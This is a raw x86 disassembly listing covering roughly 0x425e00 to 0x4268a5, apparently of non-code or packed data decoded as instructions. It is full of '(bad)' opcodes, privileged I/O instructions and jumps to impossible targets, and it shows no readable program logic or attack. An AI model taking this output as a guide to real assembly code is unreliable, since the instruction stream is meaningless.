  425e00:	out    0x52,al
  425e02:	fyl2x  
  425e04:	loopne 0x425e79
  425e06:	jbe    0x425e16
  425e08:	scas   al,BYTE PTR es:[edi]
  425e09:	xor    dl,BYTE PTR [ecx+0x7ab5c23c]
  425e0f:	aaa    
  425e10:	cmp    eax,0xd3918ee5
  425e15:	(bad)  
  425e16:	ja     0x425e6a
  425e18:	cli    
  425e19:	sub    bl,al
  425e1b:	outs   dx,BYTE PTR ds:[esi]
  425e1c:	adc    BYTE PTR es:[ecx],bl
  425e1f:	ret    
  425e20:	push   esp
  425e21:	pushf  
  425e22:	sub    eax,0x681d2272
  425e27:	std    
  425e28:	push   es
  425e29:	xor    ebp,ebp
  425e2b:	xchg   esp,eax
  425e2c:	std    
  425e2d:	xchg   ebx,eax
  425e2e:	jp     0x425e10
  425e30:	xchg   ebx,eax
  425e31:	or     BYTE PTR [ecx+0x2ca58d],al
  425e37:	dec    esp
  425e38:	div    DWORD PTR [ebp+0x4c]
  425e3b:	mov    al,ds:0x11f5ec77
  425e40:	add    edi,DWORD PTR [edi]
  425e42:	and    al,0xa4
  425e44:	shr    DWORD PTR [edx-0x4ce154c3],1
  425e4a:	add    bl,bl
  425e4c:	mov    edx,0x44faa65b
  425e51:	cwde   
  425e52:	pop    ss
  425e53:	int    0x63
  425e55:	xchg   edx,eax
  425e56:	(bad)  
  425e57:	shr    DWORD PTR ds:0xf8bc9486,1
  425e5d:	test   dl,ah
  425e5f:	xor    eax,0xb5bcd02d
  425e64:	out    dx,eax
  425e65:	mov    ebx,0x8a5b4241
  425e6a:	nop
  425e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e6c:	fyl2xp1 
  425e6e:	push   edx
  425e6f:	(bad)  
  425e70:	cmc    
  425e71:	enter  0x9a66,0x1e
  425e75:	aad    0x3f
  425e77:	pusha  
  425e78:	mov    ds:0x5997b82b,al
  425e7d:	rcr    BYTE PTR [edx+eax*1+0x17d320d1],cl
  425e84:	cwde   
  425e85:	sub    ch,BYTE PTR [edi+0x2ebcdfdd]
  425e8b:	pushf  
  425e8c:	adc    edx,eax
  425e8e:	jmp    0xeea52418
  425e93:	pop    esp
  425e94:	sahf   
  425e95:	pushf  
  425e96:	loope  0x425ee7
  425e98:	xor    ch,BYTE PTR [ebx+0x6b]
  425e9b:	and    eax,DWORD PTR [edi]
  425e9d:	sub    ah,ah
  425e9f:	ja     0x425eac
  425ea1:	xor    BYTE PTR [ecx],cl
  425ea3:	fwait
  425ea4:	rcl    BYTE PTR [eax+0x35b190f4],1
  425eaa:	pop    eax
  425eab:	fidiv  DWORD PTR [edi]
  425ead:	adc    BYTE PTR [eax],0x45
  425eb0:	or     ah,ch
  425eb2:	mov    ecx,0x91ee4bb1
  425eb7:	push   edi
  425eb8:	aas    
  425eb9:	push   esi
  425eba:	dec    edx
  425ebb:	lods   eax,DWORD PTR ds:[esi]
  425ebc:	jp     0x425ea8
  425ebe:	call   0x0:0x362e7e
	...
  425f31:	add    BYTE PTR [eax],al
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x3d]
  425f41:	in     al,dx
  425f42:	jne    0x425f93
  425f44:	jo     0x425eda
  425f46:	add    DWORD PTR [eax],eax
  425f48:	test   BYTE PTR [eax],0x0
  425f4b:	add    bl,dh
  425f4d:	mov    esp,0x94b72858
  425f52:	popa   
  425f53:	stc    
  425f54:	jp     0x425ed7
  425f56:	stos   BYTE PTR es:[edi],al
  425f57:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f59:	ficomp DWORD PTR [ebx]
  425f5b:	loope  0x425f9b
  425f5d:	div    BYTE PTR gs:[ebx]
  425f60:	xchg   BYTE PTR ds:[eax],cl
  425f63:	arpl   WORD PTR [edx+0x24e2c173],cx
  425f69:	xchg   BYTE PTR [edi-0x28595b65],ah
  425f6f:	repz fisttp WORD PTR [eax]
  425f72:	sahf   
  425f73:	jle    0x425f47
  425f75:	repz je 0x425f3f
  425f78:	(bad)
  425f7b:	pop    esp
  425f7c:	rol    BYTE PTR [edx],0x8d
  425f7f:	push   ebp
  425f80:	leave  
  425f81:	xor    ebx,DWORD PTR [edi+esi*2-0x75]
  425f85:	sbb    al,0x8e
  425f87:	xchg   ecx,eax
  425f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f89:	(bad)  
  425f8a:	jo     0x425f51
  425f8c:	loopne 0x425fa7
  425f8e:	into   
  425f8f:	sub    esi,DWORD PTR [edx]
  425f91:	and    ecx,0x3f
  425f94:	mov    ds:0x3b426ca5,al
  425f99:	jns    0x425f7e
  425f9b:	rcr    ebx,1
  425f9d:	jmp    0x425f70
  425f9f:	inc    ecx
  425fa0:	inc    ebx
  425fa1:	xor    al,0xca
  425fa3:	and    al,BYTE PTR [edi+0x5a]
  425fa6:	stc    
  425fa7:	int3   
  425fa8:	push   edx
  425fa9:	pop    edx
  425faa:	push   ebp
  425fab:	mov    eax,0x2ada3bd
  425fb0:	push   0x64
  425fb2:	or     eax,0xe28bb8cb
  425fb7:	nop
  425fb8:	ins    BYTE PTR es:[edi],dx
  425fb9:	push   ebx
  425fba:	add    DWORD PTR [ebx+0xc],esi
  425fbd:	in     eax,0x23
  425fbf:	push   0xffffffcc
  425fc1:	aas    
  425fc2:	sbb    dl,dh
  425fc4:	outs   dx,BYTE PTR ds:[esi]
  425fc5:	inc    ecx
  425fc6:	test   al,0x28
  425fc8:	(bad)  
  425fc9:	adc    cl,dl
  425fcb:	test   al,0x63
  425fcd:	jne    0x425f53
  425fcf:	mov    eax,ds:0x9da2cea6
  425fd4:	xor    ecx,ebx
  425fd6:	loope  0x425ff2
  425fd8:	inc    esi
  425fd9:	mov    ds,WORD PTR [ecx-0xa]
  425fdc:	sbb    DWORD PTR [ebx+ebx*2],eax
  425fdf:	mov    WORD PTR [ebp+0x1f0675a1],fs
  425fe5:	es sub ch,0xbb
  425fe9:	ror    cl,0xfe
  425fec:	ficomp WORD PTR [ebp+0x58]
  425fef:	mov    dl,0xc8
  425ff1:	jnp    0x426059
  425ff3:	(bad)  
  425ff4:	js     0x42604c
  425ff6:	fisttp WORD PTR [edi+edx*4-0x9a1062e]
  425ffd:	not    BYTE PTR ds:0xc0d55943
  426003:	int3   
  426004:	mov    dl,0x4e
  426006:	and    ah,BYTE PTR [edi-0x14402619]
  42600c:	inc    edx
  42600d:	and    eax,0xad539eac
  426012:	sbb    ah,BYTE PTR [edx-0xba34244]
  426018:	jp     0x425fbb
  42601a:	fs cli 
  42601c:	pop    eax
  42601d:	sbb    DWORD PTR [edi+0x6],esi
  426020:	leave  
  426021:	repz pusha 
  426023:	call   FWORD PTR [ecx+0x3a5cd3c4]
  426029:	xor    ah,0x23
  42602c:	xchg   esi,eax
  42602d:	nop
  42602e:	push   DWORD PTR [ecx+0x4e]
  426031:	inc    edi
  426032:	mov    cl,0x84
  426034:	dec    esp
  426035:	xchg   edi,eax
  426036:	test   al,0x61
  426038:	ins    DWORD PTR es:[edi],dx
  426039:	call   0xd485:0xbfd6c9af
  426040:	sbb    edi,DWORD PTR [edi+0x0]
	...
  4260b2:	add    BYTE PTR [eax],al
  4260b4:	ficom  WORD PTR [ecx]
  4260b6:	lahf   
  4260b7:	and    ebx,edi
  4260b9:	scas   eax,DWORD PTR es:[edi]
  4260ba:	(bad)  
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x5c1fc11b
  4260c4:	xchg   bp,ax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	test   BYTE PTR [eax],0x0
  4260cb:	add    ah,al
  4260cd:	(bad)  
  4260ce:	adc    al,0x7a
  4260d0:	stc    
  4260d1:	or     bl,BYTE PTR [ebp-0x42]
  4260d4:	ret    
  4260d5:	loop   0x42605d
  4260d7:	fisubr WORD PTR [edi+0x1a]
  4260da:	leave  
  4260db:	xchg   ecx,eax
  4260dc:	pop    ecx
  4260dd:	xor    al,0x32
  4260df:	pop    edi
  4260e0:	mov    ah,0x48
  4260e2:	out    dx,eax
  4260e3:	or     edi,DWORD PTR ss:[eax]
  4260e6:	pop    ebp
  4260e7:	call   0xe84a4938
  4260ec:	and    DWORD PTR [ebp+0x3e],esi
  4260ef:	dec    edi
  4260f0:	xchg   ebp,eax
  4260f1:	aas    
  4260f2:	sar    DWORD PTR [ecx],1
  4260f4:	mov    ch,0x65
  4260f6:	jno    0x4260d9
  4260f8:	xor    eax,DWORD PTR [edi-0x4e]
  4260fb:	out    dx,al
  4260fc:	xor    al,BYTE PTR [esi-0x5702b778]
  426102:	ins    DWORD PTR es:[edi],dx
  426103:	jmp    0xf63e1646
  426108:	xchg   esi,eax
  426109:	jo     0x4260ea
  42610b:	(bad)  
  42610d:	inc    ebp
  42610e:	or     al,0x46
  426110:	(bad)  
  426111:	rcl    BYTE PTR [edi+edx*4+0x67f86fe6],0x79
  426119:	cmp    ch,ah
  42611b:	shl    esi,cl
  42611d:	cmp    al,0x8c
  42611f:	mov    edi,0x3c942ec2
  426124:	cdq    
  426125:	clc    
  426126:	fwait
  426127:	repnz push ebp
  426129:	xor    eax,0xa36389b
  42612e:	mov    DWORD PTR [ebx+0x5c],esp
  426131:	pop    esi
  426132:	xchg   esi,eax
  426133:	int    0x9b
  426135:	pop    esp
  426136:	in     al,0xe7
  426138:	inc    edi
  426139:	adc    DWORD PTR [ebp+0x5f7daa02],ebx
  42613f:	test   BYTE PTR [ebp+ecx*8-0x780ec35e],0x47
  426147:	mov    bl,0xc8
  426149:	mov    eax,ds:0x5fd4166b
  42614e:	fst    DWORD PTR [ebx+0x6b]
  426151:	aas    
  426152:	push   edi
  426153:	test   eax,0x7bc8e542
  426158:	sahf   
  426159:	xchg   esp,eax
  42615a:	jo     0x426169
  42615c:	sub    BYTE PTR [ecx-0x2c4bc04f],dh
  426162:	xor    BYTE PTR [edi+0x5a],0x8b
  426166:	dec    eax
  426167:	icebp  
  426168:	call   0xc8b30f73
  42616d:	std    
  42616e:	inc    edi
  42616f:	lds    ebx,FWORD PTR [esi]
  426171:	or     esp,esp
  426173:	sub    al,BYTE PTR ds:0xf710d788
  426179:	xchg   ebp,eax
  42617a:	mov    ch,ch
  42617c:	pop    edi
  42617d:	mov    eax,ds:0xc0599e71
  426182:	sbb    esp,ecx
  426184:	outs   dx,DWORD PTR ds:[esi]
  426185:	mov    ecx,0x26dac672
  42618a:	mov    esp,0x622f9e94
  42618f:	inc    ebx
  426190:	stos   DWORD PTR es:[edi],eax
  426191:	sub    ebx,DWORD PTR [eax]
  426193:	jns    0x42619f
  426195:	les    edi,FWORD PTR [di]
  426198:	jp     0x426152
  42619a:	pop    eax
  42619b:	inc    esi
  42619c:	sbb    ecx,DWORD PTR [edi+0x37]
  42619f:	mov    WORD PTR [edx+0x3f],es
  4261a2:	jns    0x4261be
  4261a4:	and    eax,0xc68ca231
  4261a9:	mov    DWORD PTR [edx+0x57],edx
  4261ac:	xchg   esp,eax
  4261ad:	mov    al,0x6a
  4261af:	(bad)  
  4261b1:	and    bl,BYTE PTR [esi]
  4261b3:	and    al,0x64
  4261b5:	and    al,al
  4261b7:	and    dl,BYTE PTR [ebx+0x5a6c943e]
  4261bd:	ror    DWORD PTR [ecx+0xa964ef],cl
	...
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0xffffffcc
  426241:	and    al,0xc5
  426243:	push   eax
  426244:	pop    esp
  426245:	xchg   esi,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	test   BYTE PTR [eax],0x0
  42624b:	add    BYTE PTR [esi+0x6da32dd3],ch
  426251:	in     eax,0xcb
  426253:	add    eax,0x11dae287
  426258:	sar    DWORD PTR [ecx-0x43],1
  42625b:	xor    BYTE PTR [ebp-0x3334cf8f],bh
  426261:	cmp    DWORD PTR [ebp-0x54],edi
  426264:	sar    edx,cl
  426266:	out    0xb0,eax
  426268:	or     ah,BYTE PTR [ebx-0x72]
  42626b:	jbe    0x426222
  42626d:	jge    0xf6927296
  426273:	sbb    BYTE PTR [edx+0x26],dl
  426276:	pop    ecx
  426277:	fcomp  DWORD PTR [edi]
  426279:	ins    BYTE PTR es:[edi],dx
  42627a:	jle    0x4262ba
  42627c:	sub    eax,DWORD PTR [ecx]
  42627e:	fisub  DWORD PTR [eax+0xd7efb16]
  426284:	or     al,BYTE PTR [ebp+0x521b3b51]
  42628a:	sub    BYTE PTR [eax],al
  42628c:	pop    ebx
  42628d:	inc    edi
  42628e:	and    esp,eax
  426290:	jecxz  0x4262ff
  426292:	cmp    ebx,ecx
  426294:	sbb    dl,dh
  426296:	xchg   esi,eax
  426297:	hlt    
  426298:	or     BYTE PTR [ecx+esi*4+0x9],bl
  42629c:	mov    al,0x31
  42629e:	cmp    dl,BYTE PTR [ebx+edx*2-0x15]
  4262a2:	outs   dx,BYTE PTR ds:[esi]
  4262a3:	les    esp,FWORD PTR [ebx]
  4262a5:	out    0x67,eax
  4262a7:	push   edx
  4262a8:	fimul  DWORD PTR [eax]
  4262aa:	push   ds
  4262ab:	lods   al,BYTE PTR ds:[esi]
  4262ac:	mov    al,0x7e
  4262ae:	into   
  4262af:	cmp    al,BYTE PTR [ecx+0x63]
  4262b2:	adc    eax,0xc344bb93
  4262b7:	jns    0x426324
  4262b9:	inc    edx
  4262ba:	iret   
  4262bb:	push   es
  4262bc:	jno    0x426291
  4262be:	std    
  4262bf:	mov    bl,bl
  4262c1:	loopne 0x42628d
  4262c3:	lods   eax,DWORD PTR ds:[esi]
  4262c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262c5:	mov    al,0xdf
  4262c7:	mov    bl,0x77
  4262c9:	(bad)  
  4262ca:	xor    DWORD PTR [edi],esi
  4262cc:	sub    ch,BYTE PTR [ebp-0xb]
  4262cf:	in     eax,dx
  4262d0:	mov    ecx,0xe80c334f
  4262d5:	cmp    al,0x9b
  4262d7:	aam    0x9b
  4262d9:	lea    ecx,[edx-0x1b5fd92e]
  4262df:	sbb    ecx,DWORD PTR [ecx+0x27]
  4262e2:	test   BYTE PTR ds:0xd0416853,0xad
  4262e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262ea:	and    esi,DWORD PTR [ebp+eiz*1+0x19de10c]
  4262f1:	out    dx,eax
  4262f2:	pusha  
  4262f3:	cmp    ecx,DWORD PTR [edx]
  4262f5:	cli    
  4262f6:	ret    
  4262f7:	xor    ebx,DWORD PTR [ecx-0x7b]
  4262fa:	clc    
  4262fb:	ja     0x4262e9
  4262fd:	loop   0x4262ea
  4262ff:	retf   0x9e9f
  426302:	inc    ebx
  426303:	retf   
  426304:	or     eax,0x6d79ce24
  426309:	ds dec ecx
  42630b:	or     DWORD PTR [eax+ebp*2-0x219eb22b],0x30b73095
  426316:	popa   
  426317:	dec    eax
  426318:	fdiv   DWORD PTR [ebp+0x3e8fd4e0]
  42631e:	pop    ds
  42631f:	add    DWORD PTR [edx],ecx
  426321:	and    DWORD PTR [ecx],esi
  426323:	popf   
  426324:	pop    es
  426325:	enter  0x5403,0x6d
  426329:	test   eax,0x4983b9c1
  42632e:	pop    esp
  42632f:	aad    0xd5
  426331:	or     edi,DWORD PTR [ebp-0x49beb382]
  426337:	jno    0x426388
  426339:	dec    eax
  42633a:	xor    BYTE PTR [ecx],bh
  42633c:	les    ebp,FWORD PTR [esp+esi*8-0x59]
  426340:	pop    esi
  426341:	push   edi
	...
  4263b2:	add    BYTE PTR [eax],al
  4263b4:	inc    edx
  4263b5:	or     esp,eax
  4263b7:	test   eax,0xeb6fedcf
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	aas    
  4263c1:	in     al,0xe5
  4263c3:	xchg   edx,eax
  4263c4:	push   edx
  4263c5:	xchg   edi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	test   BYTE PTR [eax],0x0
  4263cb:	add    BYTE PTR ds:0x873156aa,bh
  4263d1:	(bad)  
  4263d2:	dec    edx
  4263d3:	out    dx,al
  4263d4:	dec    ecx
  4263d5:	mov    eax,ds:0xbe2a55d3
  4263da:	mov    esp,gs
  4263dc:	jae    0x4263a9
  4263de:	lds    esi,FWORD PTR [esi+ebx*2+0x76]
  4263e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e3:	pop    esp
  4263e4:	xor    bl,ch
  4263e6:	and    al,0xbd
  4263e8:	shr    BYTE PTR [ecx],cl
  4263ea:	mov    cl,0xf5
  4263ec:	ins    DWORD PTR es:[edi],dx
  4263ed:	out    0xcb,al
  4263ef:	(bad)  
  4263f0:	pop    ebx
  4263f1:	js     0x426402
  4263f3:	ss push esi
  4263f5:	loop   0x426400
  4263f7:	leave  
  4263f8:	push   edi
  4263f9:	pop    es
  4263fa:	push   esi
  4263fb:	pop    esi
  4263fc:	fist   DWORD PTR [ebx+0x75]
  4263ff:	and    bl,BYTE PTR [ebx]
  426401:	and    BYTE PTR [eax-0x4b07ee25],bl
  426407:	std    
  426408:	(bad)  
  42640a:	jecxz  0x4263b6
  42640c:	call   0x2fed:0xeb6f8212
  426413:	enter  0xbc20,0x2d
  426417:	adc    edx,DWORD PTR ds:0x3ae288ec
  42641d:	cld    
  42641e:	cdq    
  42641f:	test   eax,0xd32aa06c
  426424:	mov    DWORD PTR [ecx+eiz*2],edx
  426427:	daa    
  426428:	add    eax,0x9ac1355d
  42642d:	outs   dx,BYTE PTR ds:[esi]
  42642e:	in     al,dx
  42642f:	sahf   
  426430:	jge    0x42643c
  426432:	pop    edx
  426433:	(bad)  
  426434:	cs jbe 0x426490
  426437:	clc    
  426438:	pop    ecx
  426439:	out    dx,eax
  42643a:	in     eax,dx
  42643b:	and    DWORD PTR [ebx+0x15],ecx
  42643e:	sbb    esi,edi
  426440:	sub    al,0xf8
  426442:	and    DWORD PTR [eax-0x5e],eax
  426445:	cdq    
  426446:	push   ecx
  426447:	lods   eax,DWORD PTR ds:[esi]
  426448:	push   es
  426449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42644a:	ret    0x2788
  42644d:	add    cl,BYTE PTR [ebx]
  42644f:	inc    ebp
  426450:	push   0xffffff82
  426452:	pop    esp
  426453:	es enter 0x87f5,0xb0
  426458:	imul   ebp,DWORD PTR [eax-0xe],0x4e62d69c
  42645f:	(bad)  
  426460:	js     0x42643a
  426462:	mov    dh,0xc9
  426464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426465:	aas    
  426466:	sysret 
  426468:	adc    dl,BYTE PTR [edi-0x14]
  42646b:	cmp    BYTE PTR [eax+0x3580d178],0x9a
  426472:	dec    eax
  426473:	das    
  426474:	mov    bl,0xc8
  426476:	daa    
  426477:	xchg   ebx,eax
  426478:	inc    ecx
  426479:	sbb    cl,BYTE PTR [ecx-0x597d25b3]
  42647f:	cmp    eax,0xfd7aa4b0
  426484:	xchg   ecx,eax
  426485:	test   al,0x7f
  426487:	xchg   esp,eax
  426488:	add    BYTE PTR [esi+esi*2-0x67],bh
  42648c:	mov    BYTE PTR [ebp+eax*1-0x5ab72f03],0x59
  426494:	xor    eax,0xf0edac82
  426499:	stc    
  42649a:	inc    ebx
  42649b:	lods   eax,DWORD PTR ds:[esi]
  42649c:	mov    ecx,0x2f5a4cba
  4264a1:	xor    al,0xc6
  4264a3:	inc    eax
  4264a4:	sbb    ebp,esp
  4264a6:	or     eax,DWORD PTR ds:0x6418b557
  4264ac:	hlt    
  4264ad:	sbb    DWORD PTR [esi],esi
  4264af:	(bad)  
  4264b0:	popf   
  4264b1:	in     eax,0xd7
  4264b3:	mov    edi,0x40374db4
  4264b8:	dec    edi
  4264b9:	ficom  WORD PTR [ebx]
  4264bb:	add    bh,BYTE PTR [ecx-0x602e3131]
  4264c1:	iret   
	...
  426532:	add    BYTE PTR [eax],al
  426534:	(bad)  
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	xchg   ebx,eax
  426541:	pushf  
  426542:	ret    0x486d
  426545:	cwde   
  426546:	add    DWORD PTR [eax],eax
  426548:	test   BYTE PTR [eax],0x0
  42654b:	add    BYTE PTR [esi+eax*8+0x59],dl
  42654f:	sbb    al,0xdf
  426551:	jp     0x42651b
  426553:	jae    0x42655c
  426555:	cmp    esp,DWORD PTR ds:0xedf9357f
  42655b:	and    esp,ebp
  42655d:	inc    esp
  42655e:	mov    edi,0x874e468
  426563:	mov    ecx,0x5ce64ef2
  426568:	iret   
  426569:	jns    0x426589
  42656b:	push   esp
  42656c:	xor    esp,ecx
  42656e:	or     ch,BYTE PTR [ebp+0x25]
  426571:	xchg   ebp,eax
  426572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426573:	add    esi,edi
  426575:	mov    esp,0x3a941022
  42657a:	sub    BYTE PTR [eax+0x2f45b42],0x58
  426581:	fxch   st(0)
  426583:	(bad)  [edi-0x48cf988]
  426589:	(bad)  
  42658a:	in     eax,0x5a
  42658c:	inc    esi
  42658d:	push   0x64
  42658f:	or     eax,0x529d3e71
  426594:	mov    esp,0xe1c6368d
  426599:	jmp    0x68aae034
  42659e:	jecxz  0x426602
  4265a0:	inc    ebp
  4265a1:	push   cs
  4265a2:	out    0xe7,eax
  4265a4:	retf   0x3e58
  4265a7:	mov    eax,0x247af7c9
  4265ac:	js     0x426542
  4265ae:	test   ecx,esi
  4265b0:	xacquire xchg BYTE PTR [bx+di+0x28],cl
  4265b5:	sbb    eax,0x7e
  4265b8:	pop    ds
  4265b9:	retf   
  4265ba:	xor    ebx,edx
  4265bc:	aas    
  4265bd:	das    
  4265be:	or     eax,0x29c79e85
  4265c3:	lahf   
  4265c4:	shl    DWORD PTR [eax+0x15],0x3e
  4265c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265c9:	mov    al,ds:0x9a73949b
  4265ce:	jnp    0x426646
  4265d0:	sbb    BYTE PTR fs:[eax],dl
  4265d3:	aaa    
  4265d4:	repnz cmp eax,0x8c193d2e
  4265da:	call   0xb55cdbe2
  4265df:	sub    al,0xfc
  4265e1:	lods   al,BYTE PTR ds:[esi]
  4265e2:	xor    eax,0x4f0ca6a5
  4265e7:	js     0x426612
  4265e9:	jl     0x42663a
  4265eb:	inc    ebx
  4265ec:	xchg   ebp,eax
  4265ed:	loope  0x426617
  4265ef:	jns    0x426579
  4265f1:	das    
  4265f2:	retfw  0x3977
  4265f6:	dec    eax
  4265f7:	out    dx,al
  4265f8:	mov    dh,0xba
  4265fa:	and    cl,al
  4265fc:	jle    0x4265df
  4265fe:	fwait
  4265ff:	inc    edi
  426600:	fld    TBYTE PTR [ecx]
  426602:	cmp    bl,bl
  426604:	xor    al,BYTE PTR [ecx+0x1]
  426607:	in     eax,dx
  426608:	push   edi
  426609:	mov    dh,BYTE PTR [edi+edx*2]
  42660c:	or     ecx,0x7b91daa7
  426612:	sub    al,0xc7
  426614:	aas    
  426615:	or     ecx,ebp
  426617:	test   BYTE PTR [edi-0x4fccaf8d],0x16
  42661e:	adc    al,0x8b
  426620:	mov    ds:0x46d6dd35,eax
  426625:	test   eax,0x6bbf587f
  42662a:	rcl    bh,cl
  42662c:	add    DWORD PTR [edi],esi
  42662e:	sub    bl,BYTE PTR [ecx]
  426630:	in     eax,0xce
  426632:	test   eax,0x70a56fff
  426637:	mov    edi,0x4a9fbf00
  42663c:	cmp    cl,BYTE PTR [edi-0x1a]
  42663f:	xor    esp,ebp
  426641:	add    BYTE PTR ds:[eax],al
	...
  4266b4:	(bad)  
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	xor    DWORD PTR [ecx-0x62],eax
  4266c3:	jp     0x426703
  4266c5:	cdq    
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	test   BYTE PTR [eax],0x0
  4266cb:	add    bl,cl
  4266cd:	ret    0x410c
  4266d0:	out    dx,al
  4266d1:	mov    ebp,0xf43304f0
  4266d6:	sbb    eax,0x320c5907
  4266db:	sbb    BYTE PTR [ebx+0x4f],dh
  4266de:	and    al,0x8e
  4266e0:	jecxz  0x42669b
  4266e2:	cmp    DWORD PTR [eax-0x65],edi
  4266e5:	mov    ebp,0xaa276ad8
  4266ea:	js     0x42670b
  4266ec:	loopne 0x4266fc
  4266ee:	pushf  
  4266ef:	sbb    bh,bh
  4266f1:	hlt    
  4266f2:	mov    bl,0x48
  4266f4:	dec    eax
  4266f5:	sub    eax,0xc2108fcc
  4266fa:	fdivr  DWORD PTR [edx]
  4266fc:	mov    ecx,0xaa1d0e02
  426701:	push   ebx
  426702:	inc    edx
  426703:	or     al,0x6f
  426705:	cmp    ecx,ebx
  426707:	push   ecx
  426708:	xor    esp,DWORD PTR [edx+eiz*1]
  42670b:	sub    BYTE PTR [esi+0x1a],bh
  42670e:	(bad)  
  42670f:	out    0xce,al
  426711:	shl    DWORD PTR [ecx],1
  426713:	loope  0x4266d8
  426715:	nop
  426716:	jns    0x42669c
  426718:	je     0xee3a3bec
  42671e:	call   0x9925:0x5f689b36
  426725:	mov    bh,0x49
  426727:	int3   
  426728:	mov    eax,es:0x7d266ae4
  42672e:	aas    
  42672f:	xlat   BYTE PTR ds:[ebx]
  426730:	(bad)  
  426731:	cwde   
  426732:	stos   BYTE PTR es:[edi],al
  426733:	xchg   edi,eax
  426734:	fwait
  426735:	jne    0x4266fe
  426737:	test   BYTE PTR [eax],al
  426739:	mul    BYTE PTR [esi+ecx*4+0x55]
  42673d:	leave  
  42673e:	aaa    
  42673f:	dec    esp
  426740:	out    0x43,eax
  426742:	jle    0x4266ed
  426744:	push   esp
  426745:	pop    edx
  426746:	gs add al,0xd0
  426749:	mov    al,0x62
  42674b:	outs   dx,DWORD PTR ds:[esi]
  42674c:	rol    BYTE PTR [esi+0x68],1
  42674f:	mov    ch,0xed
  426751:	dec    ecx
  426752:	(bad)  
  426753:	cmp    cl,BYTE PTR [edx]
  426755:	addr16 mov cs,ebx
  426758:	push   es
  426759:	stc    
  42675a:	pop    esp
  42675b:	push   ss
  42675c:	adc    DWORD PTR [ecx+eax*8-0x53],edx
  426760:	mov    ah,BYTE PTR [ebp+0x51]
  426763:	adc    esp,esi
  426765:	fild   WORD PTR [esi]
  426767:	mov    esp,0x9a74a18e
  42676c:	mov    ecx,DWORD PTR [ecx]
  42676e:	lahf   
  42676f:	std    
  426770:	cli    
  426771:	lahf   
  426772:	xchg   WORD PTR [edi+eiz*8],cx
  426776:	fadd   DWORD PTR [ecx]
  426778:	mov    bl,0xff
  42677a:	repz mov esi,0x14839adb
  426780:	xor    DWORD PTR [ebx-0x3abb2e33],ebx
  426786:	and    ch,BYTE PTR [eax-0xc822997]
  42678c:	xor    BYTE PTR [ecx-0x3f6b2d1f],0x4b
  426793:	outs   dx,DWORD PTR ds:[esi]
  426794:	ins    DWORD PTR es:[edi],dx
  426795:	out    dx,eax
  426796:	dec    esp
  426797:	push   ebx
  426798:	jmp    0x841b:0xcac752e7
  42679f:	fisubr WORD PTR [edx+0x428f105e]
  4267a5:	sbb    ecx,DWORD PTR [eax+0x7040fb37]
  4267ab:	or     eax,DWORD PTR [edx]
  4267ad:	in     al,dx
  4267ae:	test   al,0xd
  4267b0:	xchg   ebx,eax
  4267b1:	mov    ecx,0x2e51b467
  4267b6:	cwde   
  4267b7:	bound  edx,QWORD PTR [eax+edi*1]
  4267ba:	loope  0x4267d7
  4267bc:	pushf  
  4267bd:	int3   
  4267be:	mov    bl,0x49
  4267c0:	(bad)  
  4267c1:	fld    QWORD PTR [eax]
	...
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x185c4e34],cl
  426843:	iret   
  426844:	xor    al,0x9a
  426846:	add    DWORD PTR [eax],eax
  426848:	test   BYTE PTR [eax],0x0
  42684b:	add    BYTE PTR [esi+0x3cdb8462],ch
  426851:	(bad)  
  426852:	mov    cl,0x97
  426854:	(bad)  
  426855:	fs inc ecx
  426857:	xlat   BYTE PTR ds:[ebx]
  426858:	lods   eax,DWORD PTR ds:[esi]
  426859:	outs   dx,BYTE PTR ds:[esi]
  42685a:	sbb    ecx,DWORD PTR [edi+0x4ac2eaf6]
  426860:	sbb    bl,BYTE PTR [ecx]
  426862:	mov    dh,BYTE PTR [edi]
  426864:	fistp  DWORD PTR [edi]
  426866:	addr16 int3 
  426868:	pop    edx
  426869:	fcomp  st(1)
  42686b:	mov    bh,BYTE PTR [ecx+0x1b48f770]
  426871:	nop
  426872:	int3   
  426873:	aam    0x38
  426875:	js     0x4267f9
  426877:	fxam   
  426879:	scas   al,BYTE PTR es:[edi]
  42687a:	sbb    DWORD PTR [eax],edx
  42687c:	and    bl,0x91
  42687f:	adc    al,0xcf
  426881:	jb     0x42686f
  426883:	adc    DWORD PTR [esi+0x2e200413],esi
  426889:	fidivr DWORD PTR [edi]
  42688b:	mov    eax,0x33862311
  426890:	cmp    bh,BYTE PTR [ebx+0x5960f787]
  426896:	pop    eax
  426897:	je     0x426824
  426899:	dec    edx
  42689a:	push   edi
  42689b:	retf   0x9057
  42689e:	pop    eax
  42689f:	inc    DWORD PTR [edx+ecx*4-0xa]
  4268a3:	push   0xffffffb0
  4268a5:	ret    
